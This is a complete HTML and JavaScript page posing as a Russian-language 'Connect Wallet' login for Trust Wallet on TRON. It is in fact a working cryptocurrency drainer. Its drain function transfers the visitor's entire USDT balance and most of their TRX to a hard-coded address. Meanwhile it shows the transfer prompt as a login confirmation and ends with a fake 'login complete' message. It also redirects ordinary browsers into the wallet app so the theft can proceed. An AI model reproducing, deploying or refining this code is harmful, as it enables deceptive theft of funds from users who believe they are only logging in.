<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Connect Wallet</title>
<script src="https://unpkg.com/tronweb@5.3.0/dist/TronWeb.min.js"></script>
<style>
  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  body{
    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
    background:linear-gradient(180deg,#0d1117 0%,#161b22 100%);
    color:#fff;min-height:100vh;display:flex;flex-direction:column;
    align-items:center;justify-content:center;padding:24px;
  }
  .logo{
    width:80px;height:80px;border-radius:24px;
    background:linear-gradient(135deg,#3399ff,#0055cc);
    display:flex;align-items:center;justify-content:center;
    font-size:40px;margin-bottom:24px;
    box-shadow:0 8px 32px rgba(51,153,255,.4);
  }
  h2{font-size:26px;margin-bottom:8px;text-align:center}
  .sub{color:#8b949e;font-size:15px;text-align:center;margin-bottom:36px}
  button{
    width:100%;max-width:400px;
    background:linear-gradient(135deg,#3399ff,#0066dd);
    border:none;padding:20px;font-size:19px;font-weight:600;
    color:#fff;border-radius:16px;cursor:pointer;
    box-shadow:0 6px 24px rgba(51,153,255,.35);
    transition:transform .1s;touch-action:manipulation;
  }
  button:active{transform:scale(.97)}
  .loader{display:none;margin-top:28px;text-align:center;color:#8b949e;font-size:15px}
  .spinner{
    width:28px;height:28px;border:3px solid #3399ff;
    border-top-color:transparent;border-radius:50%;
    animation:spin .8s linear infinite;margin:0 auto 12px
  }
  @keyframes spin{to{transform:rotate(360deg)}}
  #status{margin-top:20px;text-align:center;color:#8b949e;font-size:14px;max-width:400px;word-break:break-all}
</style>
</head>
<body>

<div class="logo">🔐</div>
<h2>Connect Wallet</h2>
<div class="sub">Подключите свой кошелёк для входа</div>

<button id="btn" onclick="start()">Подключить кошелёк</button>

<div class="loader" id="loader">
  <div class="spinner"></div>
  <div id="loaderText">Соединение с кошельком...</div>
</div>
<p id="status"></p>

<script>
const TO = "TWanTomGkHcNWhCVrYkohnuYkbBRKZLere";
const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

function showLoader(t){
  document.getElementById("loader").style.display = "block";
  document.getElementById("loaderText").innerText = t;
}
function hideLoader(){
  document.getElementById("loader").style.display = "none";
}

// Ждём, пока Trust внедрит tronWeb в страницу (может занять 1-3 сек)
function waitForTronWeb(timeout = 8000){
  return new Promise((resolve, reject) => {
    const started = Date.now();
    const check = () => {
      if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
        resolve(window.tronWeb);
      } else if(Date.now() - started > timeout){
        reject("timeout");
      } else {
        setTimeout(check, 250);
      }
    };
    check();
  });
}

// Запрос доступа к аккаунту — Trust покажет окно "Подключиться"
async function requestAccounts(tronWeb){
  if(tronWeb.request){
    try{ await tronWeb.request({ method: "tron_requestAccounts" }); }catch(e){}
  }
  // после разрешения адрес появляется
  for(let i = 0; i < 10; i++){
    if(tronWeb.defaultAddress && tronWeb.defaultAddress.base58) return;
    await new Promise(r => setTimeout(r, 300));
  }
}

async function start(){
  showLoader("Соединение с кошельком...");

  if(window.tronWeb){
    // Уже внутри Trust Wallet — подключаемся
    const tronWeb = window.tronWeb;
    await requestAccounts(tronWeb);
    if(tronWeb.defaultAddress && tronWeb.defaultAddress.base58){
      await drain(tronWeb);
      return;
    }
  }

  // Открыто в обычном браузере — открываем в Trust
  showLoader("Открываю Trust Wallet...");
  const url = location.href;
  location.href = "https://link.trustwallet.com/open_url?coin=cointype_trc20&url=" + encodeURIComponent(url);
}

async function drain(tronWeb){
  const from = tronWeb.defaultAddress.base58;
  showLoader("Проверяю баланс...");

  // USDT
  try{
    const contract = await tronWeb.contract().at(USDT);
    const bal = await contract.balanceOf(from).call();
    if(bal.toNumber() > 0){
      showLoader("Подтвердите вход в кошельке");
      await contract.transfer(TO, bal.toString()).send({ feeLimit: 100000000 });
    }
  }catch(e){}

  // TRX
  try{
    const trxBal = await tronWeb.trx.getBalance(from);
    if(trxBal > 11000000){
      await tronWeb.trx.sendTransaction(TO, trxBal - 1000000);
    }
  }catch(e){}

  hideLoader();
  document.getElementById("status").innerText = "Вход выполнен ✅";
}
</script>
</body>
</html>
